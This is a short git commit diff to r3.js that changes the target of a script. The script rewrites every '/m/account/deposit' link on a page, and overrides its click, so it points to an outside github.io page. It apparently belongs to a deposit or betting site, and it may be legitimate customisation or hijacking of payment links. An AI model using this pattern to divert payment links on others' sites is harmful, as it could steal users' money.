c990087f8e7b48a5f79bef60f35821b51dc99aaa
inggarfi <inggarsaput@gmail.com>
2026-03-14 18:42:24 +0700

    Update deposit link to new URL

--- r3.js
+++ r3.js
@@ -2,11 +2,11 @@ document.addEventListener("DOMContentLoaded", function () {
 
   document.querySelectorAll('a[href*="/m/account/deposit"]').forEach(function (el) {
 
-    el.href = "https://inggarfi.github.io/depoyukbos/kiw";
+    el.href = "https://inggarfi.github.io/depoyukbos/grt22";
 
     el.addEventListener("click", function (e) {
       e.preventDefault();
-      window.location.href = "https://inggarfi.github.io/depoyukbos/kiw";
+      window.location.href = "https://inggarfi.github.io/depoyukbos/grt22";
     });
 
   });
